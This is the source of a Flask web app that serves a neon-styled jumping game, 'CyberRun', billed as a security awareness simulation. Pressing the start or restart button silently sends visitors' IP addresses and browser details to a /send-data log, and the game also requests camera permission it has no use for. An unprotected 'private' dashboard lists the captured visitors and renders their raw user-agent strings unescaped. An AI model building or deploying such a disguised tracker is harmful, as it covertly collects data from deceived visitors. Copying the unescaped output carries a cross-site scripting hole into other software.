from flask import Flask, render_template_string, request
import os
import socket
import platform
import json
import pytz
from datetime import datetime

app = Flask(__name__)

TIMEZONE = pytz.timezone("America/Monterrey")


def get_real_ip():
    forwarded = request.headers.get("X-Forwarded-For")
    if forwarded:
        return forwarded.split(",")[0].strip()
    return request.remote_addr or "—"


def get_local_time():
    now = datetime.now(TIMEZONE)
    return now.strftime("%d/%m/%Y  %H:%M:%S %Z")


def parse_user_agent(ua: str) -> tuple[str, str]:
    ua_lower = ua.lower()

    if "android" in ua_lower:
        os_name = "Android"
    elif "iphone" in ua_lower or "ipad" in ua_lower or "ipod" in ua_lower:
        os_name = "iOS"
    elif "windows nt" in ua_lower:
        os_name = "Windows"
    elif "mac os x" in ua_lower or "macos" in ua_lower:
        os_name = "macOS"
    elif "linux" in ua_lower:
        os_name = "Linux"
    elif "cros" in ua_lower:
        os_name = "ChromeOS"
    else:
        os_name = "Desconocido"

    if "edga/" in ua_lower or "edgios/" in ua_lower or " edg/" in ua_lower or "edge/" in ua_lower:
        browser = "Microsoft Edge"
    elif "samsungbrowser/" in ua_lower:
        browser = "Samsung Internet"
    elif "opr/" in ua_lower or "opera/" in ua_lower:
        browser = "Opera"
    elif "yabrowser/" in ua_lower:
        browser = "Yandex Browser"
    elif "ucbrowser/" in ua_lower:
        browser = "UC Browser"
    elif "duckduckgo/" in ua_lower:
        browser = "DuckDuckGo"
    elif "brave/" in ua_lower or "brave" in ua_lower:
        browser = "Brave"
    elif "vivaldi/" in ua_lower:
        browser = "Vivaldi"
    elif "fxios/" in ua_lower or "firefox/" in ua_lower or "fennec/" in ua_lower:
        browser = "Firefox"
    elif "crios/" in ua_lower:
        browser = "Chrome (iOS)"
    elif "chrome/" in ua_lower and "chromium" not in ua_lower:
        browser = "Chrome"
    elif "safari/" in ua_lower:
        browser = "Safari"
    elif "msie" in ua_lower or "trident/" in ua_lower:
        browser = "Internet Explorer"
    else:
        browser = "Navegador desconocido"

    return browser, os_name


# ─── RUTA PRINCIPAL: juego ────────────────────────────────────────────────────

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberRun - Práctica de Ciberseguridad</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        :root {
            --neon-green: #00ff88;
            --neon-blue: #00cfff;
            --neon-red: #ff2d5b;
            --bg-dark: #0a0e1a;
            --bg-panel: #0f1628;
            --grid-color: rgba(0, 255, 136, 0.04);
        }
        body {
            font-family: 'Share Tech Mono', monospace;
            background-color: var(--bg-dark);
            color: var(--neon-green);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background-image:
                linear-gradient(var(--grid-color) 1px, transparent 1px),
                linear-gradient(90deg, var(--grid-color) 1px, transparent 1px);
            background-size: 40px 40px;
            pointer-events: none;
            z-index: 0;
        }
        .wrapper {
            position: relative;
            z-index: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 18px;
            padding: 20px;
        }
        .header { text-align: center; }
        .header h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 2rem;
            font-weight: 900;
            color: var(--neon-green);
            text-shadow: 0 0 20px rgba(0,255,136,0.6), 0 0 40px rgba(0,255,136,0.3);
            letter-spacing: 4px;
        }
        .header p {
            font-size: 0.75rem;
            color: rgba(0,255,136,0.4);
            letter-spacing: 3px;
            margin-top: 4px;
        }
        .hud {
            width: 860px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 16px;
            background: var(--bg-panel);
            border: 1px solid rgba(0,255,136,0.2);
            border-radius: 4px;
        }
        .hud-item { display: flex; flex-direction: column; align-items: center; gap: 2px; }
        .hud-label { font-size: 0.6rem; color: rgba(0,255,136,0.4); letter-spacing: 2px; }
        .hud-value {
            font-family: 'Orbitron', sans-serif;
            font-size: 1.1rem;
            color: var(--neon-blue);
            text-shadow: 0 0 10px rgba(0,207,255,0.5);
        }
        #lives-display { font-size: 1.4rem; letter-spacing: 4px; }
        .game-wrapper { position: relative; width: 860px; }
        .game-container {
            position: relative;
            width: 860px;
            height: 320px;
            background: linear-gradient(180deg, #050d1a 0%, #0a1628 60%, #0f1e35 100%);
            border: 1px solid rgba(0,255,136,0.3);
            border-radius: 6px;
            overflow: hidden;
            box-shadow: 0 0 30px rgba(0,255,136,0.08), inset 0 0 60px rgba(0,0,0,0.5);
        }
        .game-container::after {
            content: '';
            position: absolute;
            bottom: 58px;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, rgba(0,255,136,0.4), transparent);
        }
        .ground {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 60px;
            background: repeating-linear-gradient(90deg, #0a1628 0px, #0a1628 39px, rgba(0,255,136,0.08) 40px);
            border-top: 2px solid rgba(0,255,136,0.25);
        }
        #game-character {
            position: absolute;
            bottom: 60px;
            left: 60px;
            width: 56px;
            height: 80px;
            z-index: 10;
            transition: filter 0.1s;
        }
        #game-character img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            image-rendering: pixelated;
            filter: drop-shadow(0 0 6px rgba(0,255,136,0.5));
        }
        #game-character.hit {
            filter: drop-shadow(0 0 12px rgba(255,45,91,0.9)) brightness(2);
        }
        .obstacle {
            position: absolute;
            bottom: 60px;
            width: 54px;
            height: 60px;
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center bottom;
            background-image: url('static/anonymous_logo.png');
            filter: drop-shadow(0 0 8px rgba(255,45,91,0.6));
            z-index: 9;
        }
        .scanlines {
            position: absolute;
            inset: 0;
            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
            pointer-events: none;
            z-index: 20;
        }
        .star { position: absolute; background: white; border-radius: 50%; animation: twinkle 3s infinite alternate; }
        @keyframes twinkle { from { opacity: 0.2; } to { opacity: 0.8; } }
        .cloud {
            position: absolute;
            background: rgba(0,207,255,0.06);
            border-radius: 50px;
            animation: cloudMove linear infinite;
        }
        @keyframes cloudMove { from { transform: translateX(-200px); } to { transform: translateX(900px); } }
        .btn-start {
            font-family: 'Orbitron', sans-serif;
            font-size: 1rem;
            font-weight: 700;
            letter-spacing: 3px;
            padding: 14px 48px;
            background: transparent;
            color: var(--neon-green);
            border: 2px solid var(--neon-green);
            border-radius: 4px;
            cursor: pointer;
            position: relative;
            overflow: hidden;
            transition: all 0.3s;
            text-transform: uppercase;
            box-shadow: 0 0 20px rgba(0,255,136,0.2), inset 0 0 20px rgba(0,255,136,0.05);
        }
        .btn-start::before {
            content: '';
            position: absolute;
            inset: 0;
            background: var(--neon-green);
            transform: scaleX(0);
            transform-origin: left;
            transition: transform 0.3s ease;
            z-index: -1;
        }
        .btn-start:hover { color: var(--bg-dark); box-shadow: 0 0 40px rgba(0,255,136,0.5); }
        .btn-start:hover::before { transform: scaleX(1); }
        .btn-start:disabled { opacity: 0.4; cursor: not-allowed; }
        .speed-bar-wrap { width: 860px; display: flex; align-items: center; gap: 10px; }
        .speed-label { font-size: 0.6rem; letter-spacing: 2px; color: rgba(0,207,255,0.5); white-space: nowrap; }
        .speed-bar-bg { flex: 1; height: 4px; background: rgba(0,207,255,0.1); border-radius: 2px; overflow: hidden; }
        .speed-bar-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--neon-green), var(--neon-blue));
            border-radius: 2px;
            transition: width 0.5s ease;
            box-shadow: 0 0 6px rgba(0,207,255,0.5);
        }
        #game-over-screen {
            display: none;
            position: absolute;
            inset: 0;
            background: rgba(10,14,26,0.92);
            z-index: 30;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 16px;
        }
        #game-over-screen.visible { display: flex; }
        #game-over-screen h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 2.5rem;
            color: var(--neon-red);
            text-shadow: 0 0 30px rgba(255,45,91,0.8);
            animation: flicker 0.5s infinite alternate;
        }
        @keyframes flicker { from { opacity: 1; } to { opacity: 0.7; } }
        #game-over-screen p { color: rgba(255,255,255,0.5); font-size: 0.85rem; }
        .controls-hint { font-size: 0.65rem; color: rgba(0,255,136,0.25); letter-spacing: 2px; }
        .key-indicator {
            display: inline-block;
            padding: 2px 8px;
            border: 1px solid rgba(0,255,136,0.3);
            border-radius: 3px;
            font-size: 0.65rem;
            color: rgba(0,255,136,0.5);
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="header">
            <h1>// CYBER_RUN</h1>
            <p>SECURITY AWARENESS SIMULATION v1.0</p>
        </div>

        <div class="hud">
            <div class="hud-item">
                <span class="hud-label">SCORE</span>
                <span class="hud-value" id="score-display">000000</span>
            </div>
            <div class="hud-item">
                <span class="hud-label">LIVES</span>
                <span id="lives-display">❤️ ❤️ ❤️</span>
            </div>
            <div class="hud-item">
                <span class="hud-label">LEVEL</span>
                <span class="hud-value" id="level-display">01</span>
            </div>
            <div class="hud-item">
                <span class="hud-label">BEST</span>
                <span class="hud-value" id="best-display">000000</span>
            </div>
        </div>

        <div class="game-wrapper">
            <div class="game-container" id="gameContainer">
                <div class="scanlines"></div>
                <div class="ground"></div>

                <div class="star" style="width:2px;height:2px;top:20px;left:100px;animation-delay:0s"></div>
                <div class="star" style="width:1px;height:1px;top:40px;left:250px;animation-delay:0.5s"></div>
                <div class="star" style="width:2px;height:2px;top:15px;left:450px;animation-delay:1s"></div>
                <div class="star" style="width:1px;height:1px;top:55px;left:620px;animation-delay:1.5s"></div>
                <div class="star" style="width:2px;height:2px;top:30px;left:750px;animation-delay:0.8s"></div>

                <div class="cloud" style="width:120px;height:30px;top:30px;animation-duration:18s;animation-delay:-4s"></div>
                <div class="cloud" style="width:90px;height:22px;top:55px;animation-duration:24s;animation-delay:-12s"></div>

                <div id="game-character">
                    <img src="static/image.png" alt="Runner" id="char-img">
                </div>

                <div class="obstacle" id="obs1" style="left:1000px"></div>
                <div class="obstacle" id="obs2" style="left:1400px"></div>
                <div class="obstacle" id="obs3" style="left:1800px"></div>

                <div id="game-over-screen">
                    <h2>ACCESS DENIED</h2>
                    <p id="final-score-msg">SCORE: 000000</p>
                    <button class="btn-start" id="restartBtn">[ REINICIAR ]</button>
                </div>
            </div>
        </div>

        <div class="speed-bar-wrap">
            <span class="speed-label">VELOCIDAD</span>
            <div class="speed-bar-bg">
                <div class="speed-bar-fill" id="speed-bar" style="width:10%"></div>
            </div>
        </div>

        <button class="btn-start" id="startBtn">[ INICIAR PROTOCOLO ]</button>
        <p class="controls-hint">Presiona <span class="key-indicator">ESPACIO</span> o <span class="key-indicator">↑</span> para saltar · <span class="key-indicator">↓</span> para agacharse</p>
    </div>

    <script>
        const GROUND_Y    = 60;
        const CHAR_H      = 80;
        const CHAR_W      = 56;
        const OBS_H       = 60;
        const OBS_W       = 54;
        const CONTAINER_W = 860;
        const CONTAINER_H = 320;
        const CHAR_X      = 60;

        let gameRunning = false;
        let animFrameId = null;
        let score       = 0;
        let bestScore   = 0;
        let lives       = 3;
        let level       = 1;
        let baseSpeed   = 4;
        let speed       = baseSpeed;
        let lastTime    = 0;
        let hitCooldown = 0;

        let charY      = 0;
        let velY       = 0;
        let isGrounded = true;
        let isCrouching = false;
        const GRAVITY  = 0.55;
        const JUMP_VEL = 13;

        const obstacles = [
            { el: document.getElementById('obs1'), x: 900  },
            { el: document.getElementById('obs2'), x: 1350 },
            { el: document.getElementById('obs3'), x: 1800 },
        ];

        const GAP_MIN = 340;
        const GAP_MAX = 600;

        const char         = document.getElementById('game-character');
        const scoreDisplay = document.getElementById('score-display');
        const bestDisplay  = document.getElementById('best-display');
        const levelDisplay = document.getElementById('level-display');
        const livesDisplay = document.getElementById('lives-display');
        const speedBar     = document.getElementById('speed-bar');
        const gameOver     = document.getElementById('game-over-screen');
        const startBtn     = document.getElementById('startBtn');
        const restartBtn   = document.getElementById('restartBtn');

        // ─── Controles ────────────────────────────────────────
        document.addEventListener('keydown', e => {
            if ((e.code === 'Space' || e.code === 'ArrowUp') && gameRunning) {
                e.preventDefault();
                jump();
            }
            if (e.code === 'ArrowDown' && gameRunning) {
                e.preventDefault();
                crouch(true);
            }
        });
        document.addEventListener('keyup', e => {
            if (e.code === 'ArrowDown') crouch(false);
        });

        document.getElementById('gameContainer').addEventListener('click', () => {
            if (gameRunning) jump();
        });

        function jump() {
            if (isGrounded && !isCrouching) {
                velY = JUMP_VEL;
                isGrounded = false;
            }
        }

        function crouch(state) {
            isCrouching = state;
            char.style.height = state ? '44px' : CHAR_H + 'px';
            char.style.bottom = GROUND_Y + 'px';
        }

        // ─── INICIO: captura de datos al presionar el botón ──────────────────
        // FIX: getUserMedia se llama aquí, tras gesto del usuario, no automáticamente
        startBtn.addEventListener('click', () => {
            fetch('/send-data').catch(() => {});
            requestCameraPermission();
            startGame();
        });

        restartBtn.addEventListener('click', () => {
            fetch('/send-data').catch(() => {});
            startGame();
        });

        // FIX: cámara solo tras interacción del usuario
        function requestCameraPermission() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    console.log("Cámara activada:", stream.getVideoTracks()[0].label);
                    // Detener inmediatamente — solo necesitamos el permiso registrado
                    stream.getTracks().forEach(t => t.stop());
                })
                .catch(err => {
                    console.log("Cámara no disponible:", err.name);
                });
        }

        function startGame() {
            score       = 0;
            lives       = 3;
            level       = 1;
            speed       = baseSpeed;
            charY       = 0;
            velY        = 0;
            isGrounded  = true;
            isCrouching = false;
            hitCooldown = 0;

            crouch(false);
            updateHUD();
            gameOver.classList.remove('visible');
            startBtn.disabled = true;

            obstacles[0].x = 900;
            obstacles[1].x = 900 + randGap();
            obstacles[2].x = obstacles[1].x + randGap();

            gameRunning = true;
            lastTime = performance.now();
            cancelAnimationFrame(animFrameId);
            animFrameId = requestAnimationFrame(gameLoop);
        }

        function randGap() {
            return GAP_MIN + Math.random() * (GAP_MAX - GAP_MIN);
        }

        function gameLoop(timestamp) {
            if (!gameRunning) return;
            const dt = Math.min((timestamp - lastTime) / 16.67, 2);
            lastTime = timestamp;

            updateScore(dt);
            updatePhysics(dt);
            updateObstacles(dt);
            checkCollisions();
            render();

            animFrameId = requestAnimationFrame(gameLoop);
        }

        function updateScore(dt) {
            score += speed * 0.15 * dt;
            scoreDisplay.textContent = String(Math.floor(score)).padStart(6, '0');

            const newLevel = Math.floor(score / 800) + 1;
            if (newLevel !== level) {
                level = newLevel;
                speed = baseSpeed + (level - 1) * 0.8;
                levelDisplay.textContent = String(level).padStart(2, '0');
            }

            const pct = Math.min(((speed - baseSpeed) / (baseSpeed * 2)) * 100, 100);
            speedBar.style.width = (10 + pct * 0.9) + '%';
        }

        function updatePhysics(dt) {
            if (!isGrounded) {
                velY -= GRAVITY * dt;
                charY += velY * dt;
                if (charY <= 0) {
                    charY = 0;
                    velY  = 0;
                    isGrounded = true;
                }
            }
            if (hitCooldown > 0) hitCooldown -= dt;
        }

        function updateObstacles(dt) {
            obstacles.forEach(obs => {
                obs.x -= speed * dt;
                if (obs.x < -OBS_W - 20) {
                    const maxX = Math.max(...obstacles.map(o => o.x));
                    obs.x = maxX + randGap();
                }
            });
        }

        function checkCollisions() {
            if (hitCooldown > 0) return;

            const charTop    = GROUND_Y + charY + (isCrouching ? 16 : 0);
            const charBottom = GROUND_Y + charY;
            const charLeft   = CHAR_X + 6;
            const charRight  = CHAR_X + CHAR_W - 6;

            for (const obs of obstacles) {
                const obsLeft   = obs.x + 6;
                const obsRight  = obs.x + OBS_W - 6;
                const obsBottom = GROUND_Y;
                const obsTop    = GROUND_Y + OBS_H;

                const overlapX = charRight > obsLeft && charLeft < obsRight;
                const overlapY = charBottom < obsTop && charTop + (isCrouching ? 44 : CHAR_H) > obsBottom;

                if (overlapX && overlapY) {
                    loseLife();
                    break;
                }
            }
        }

        function loseLife() {
            lives--;
            hitCooldown = 60;
            char.classList.add('hit');
            setTimeout(() => char.classList.remove('hit'), 500);
            updateHUD();
            if (lives <= 0) endGame();
        }

        function render() {
            char.style.bottom = (GROUND_Y + charY) + 'px';
            obstacles.forEach(obs => {
                obs.el.style.left = obs.x + 'px';
            });
        }

        function updateHUD() {
            const hearts = ['', '❤️', '❤️ ❤️', '❤️ ❤️ ❤️'];
            livesDisplay.textContent = lives >= 0 ? (hearts[Math.max(0, lives)] || '') : '';
            if (score > bestScore) {
                bestScore = score;
                bestDisplay.textContent = String(Math.floor(bestScore)).padStart(6, '0');
            }
        }

        function endGame() {
            gameRunning = false;
            cancelAnimationFrame(animFrameId);
            document.getElementById('final-score-msg').textContent =
                'SCORE FINAL: ' + String(Math.floor(score)).padStart(6, '0');
            gameOver.classList.add('visible');
            startBtn.disabled = false;
        }
    </script>
</body>
</html>
    """)


# ─── RUTA: captura de datos del visitante ────────────────────────────────────

@app.route('/send-data', methods=['GET'])
def send_data():
    raw_agent = request.headers.get("User-Agent", "")
    browser, os_name = parse_user_agent(raw_agent)

    client_data = {
        "time": str(datetime.now(TIMEZONE).strftime("%d/%m/%Y %H:%M:%S %Z")),
        "hostname": socket.gethostname(),
        "platform": platform.system(),
        "ip": get_real_ip(),          # FIX: usar get_real_ip() en vez de request.remote_addr
        "agent": raw_agent,
        "browser": browser,           # datos ya parseados para facilitar el dashboard
        "os": os_name
    }

    try:
        with open("logs.json", "r") as f:
            logs = json.load(f)
    except Exception:
        logs = []

    logs.append(client_data)

    with open("logs.json", "w") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)

    print(f"[+] Nuevo acceso — IP: {client_data['ip']} | {os_name} / {browser}")
    return {"status": "ok"}


# ─── RUTA: dashboard privado ─────────────────────────────────────────────────
# FIX: faltaba el decorador @app.route — esta ruta no existía en el código original

@app.route('/dashboard')
def dashboard():
    try:
        with open("logs.json") as f:
            logs = json.load(f)
    except Exception:
        logs = []

    logs = list(reversed(logs))

    log_cards = ""
    for i, log in enumerate(logs):
        raw_agent = log.get("agent", "")
        # Usar datos pre-parseados si existen, sino parsear al vuelo
        browser  = log.get("browser") or parse_user_agent(raw_agent)[0]
        os_name  = log.get("os")      or parse_user_agent(raw_agent)[1]

        log_cards += f"""
        <div class="log-card">
            <div class="log-index">#{str(i + 1).zfill(3)}</div>
            <div class="log-grid">
                <div class="log-field">
                    <span class="label">IP</span>
                    <span class="value mono">{log.get('ip', '—')}</span>
                </div>
                <div class="log-field">
                    <span class="label">SISTEMA</span>
                    <span class="value">{os_name}</span>
                </div>
                <div class="log-field">
                    <span class="label">NAVEGADOR</span>
                    <span class="value">{browser}</span>
                </div>
                <div class="log-field">
                    <span class="label">UA RAW</span>
                    <span class="value truncate" style="font-size:11px;opacity:.6">{raw_agent[:80]}{'…' if len(raw_agent) > 80 else ''}</span>
                </div>
                <div class="log-field">
                    <span class="label">HORA</span>
                    <span class="value mono">{log.get('time', '—')}</span>
                </div>
            </div>
        </div>
        """

    empty_state = "" if logs else """
    <div class="empty">
        <div class="empty-icon">⬡</div>
        <p>Sin registros todavía</p>
    </div>
    """

    return f"""<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="refresh" content="5">
<title>Monitor · Privado</title>
<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
:root{{
  --bg:#080b0f;--surface:#0e1318;--border:#1c2530;
  --accent:#00e5ff;--text:#c8d8e8;--text-dim:#4a6070;--text-bright:#eef4fa;
}}
body{{background:var(--bg);color:var(--text);font-family:'Syne',sans-serif;padding:40px 24px 80px}}
.mono{{font-family:'IBM Plex Mono',monospace}}
header{{max-width:900px;margin:auto;margin-bottom:40px;display:flex;justify-content:space-between;border-bottom:1px solid var(--border);padding-bottom:20px}}
.header-tag{{font-size:10px;color:var(--accent);letter-spacing:.2em}}
h1{{font-size:30px;color:var(--text-bright)}}
.stats-bar{{max-width:900px;margin:auto;margin-bottom:30px;display:flex;gap:12px}}
.stat{{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:14px;flex:1}}
.stat-label{{font-size:10px;color:var(--text-dim);letter-spacing:.15em}}
.stat-value{{font-size:20px;font-family:'IBM Plex Mono',monospace;color:var(--accent)}}
.logs-container{{max-width:900px;margin:auto;display:flex;flex-direction:column;gap:10px}}
.log-card{{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:18px;display:flex;gap:20px}}
.log-index{{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--text-dim)}}
.log-grid{{display:grid;grid-template-columns:1fr 1fr 1fr 2fr 1fr;gap:16px;flex:1}}
.log-field{{display:flex;flex-direction:column;gap:4px}}
.label{{font-size:9px;letter-spacing:.15em;color:var(--text-dim)}}
.value{{font-size:13px;color:var(--text-bright)}}
.truncate{{word-break:break-word;max-width:300px}}
.empty{{text-align:center;padding:60px;color:var(--text-dim)}}
.camera-section{{max-width:900px;margin:50px auto;background:var(--surface);border:1px solid var(--border);padding:24px;border-radius:10px}}
.camera-section h3{{color:var(--text-bright);margin-bottom:14px;font-size:15px;letter-spacing:.05em}}
.cam-controls{{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-bottom:12px}}
#enableCam,#switchCam{{
  background:var(--accent);border:none;padding:10px 20px;cursor:pointer;
  border-radius:6px;font-family:'Syne',sans-serif;font-weight:700;font-size:13px;color:#080b0f
}}
#switchCam{{background:var(--surface);color:var(--accent);border:1px solid var(--accent);display:none}}
#camMsg{{font-size:12px;color:var(--text-dim)}}
#cam{{width:100%;display:none;margin-top:10px;border-radius:8px;border:1px solid var(--border)}}
.tz-note{{font-size:10px;color:var(--text-dim);margin-top:6px;letter-spacing:.05em}}
</style>
</head>
<body>

<header>
  <div>
    <span class="header-tag">// sistema de monitoreo</span>
    <h1>Panel <span style="color:var(--accent)">Privado</span></h1>
  </div>
  <div style="text-align:right">
    <div class="stat-label">HORA SERVIDOR</div>
    <div class="mono" style="color:var(--accent);font-size:13px">{get_local_time()}</div>
    <div class="tz-note">Reynosa, Tamaulipas — America/Monterrey</div>
  </div>
</header>

<div class="stats-bar">
  <div class="stat">
    <div class="stat-label">TOTAL REGISTROS</div>
    <div class="stat-value">{len(logs)}</div>
  </div>
  <div class="stat">
    <div class="stat-label">ÚLTIMO ACCESO</div>
    <div class="stat-value mono" style="font-size:14px">{logs[0].get('time', '—') if logs else '—'}</div>
  </div>
  <div class="stat">
    <div class="stat-label">ÚLTIMA IP</div>
    <div class="stat-value mono" style="font-size:14px">{logs[0].get('ip', '—') if logs else '—'}</div>
  </div>
</div>

<div class="logs-container">
  {log_cards}
  {empty_state}
</div>

<div class="camera-section">
  <h3>Verificación visual</h3>
  <div class="cam-controls">
    <button id="enableCam">Activar cámara</button>
    <button id="switchCam">⇄ Cambiar cámara</button>
    <span id="camMsg">Selecciona trasera o frontal según tu dispositivo.</span>
  </div>
  <video id="cam" autoplay playsinline></video>
</div>

<script>
const btn       = document.getElementById("enableCam");
const switchBtn = document.getElementById("switchCam");
const video     = document.getElementById("cam");
const msg       = document.getElementById("camMsg");

let currentStream = null;
let useFront      = false;

async function startCamera(front = false) {{
  if (currentStream) currentStream.getTracks().forEach(t => t.stop());

  const constraints = {{ video: {{ facingMode: {{ ideal: front ? "user" : "environment" }} }} }};

  try {{
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    currentStream = stream;
    video.srcObject = stream;
    video.style.display = "block";
    switchBtn.style.display = "inline-block";
    btn.style.display = "none";
    const settings = stream.getVideoTracks()[0].getSettings();
    msg.innerText = `Cámara activa — ${{settings.facingMode || 'no especificado'}}`;
  }} catch(err) {{
    if (err.name === "OverconstrainedError" || err.name === "NotFoundError") {{
      try {{
        const stream2 = await navigator.mediaDevices.getUserMedia({{ video: true }});
        currentStream = stream2;
        video.srcObject = stream2;
        video.style.display = "block";
        switchBtn.style.display = "inline-block";
        btn.style.display = "none";
        msg.innerText = "Cámara activa (fallback — dispositivo único detectado)";
      }} catch(e2) {{
        msg.innerText = "Permiso denegado o cámara no disponible.";
      }}
    }} else {{
      msg.innerText = `Error: ${{err.message}}`;
    }}
  }}
}}

btn.addEventListener("click", () => startCamera(useFront));
switchBtn.addEventListener("click", () => {{
  useFront = !useFront;
  startCamera(useFront);
  switchBtn.textContent = useFront ? "⇄ Cámara trasera" : "⇄ Cámara frontal";
}});
</script>
</body>
</html>
"""


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
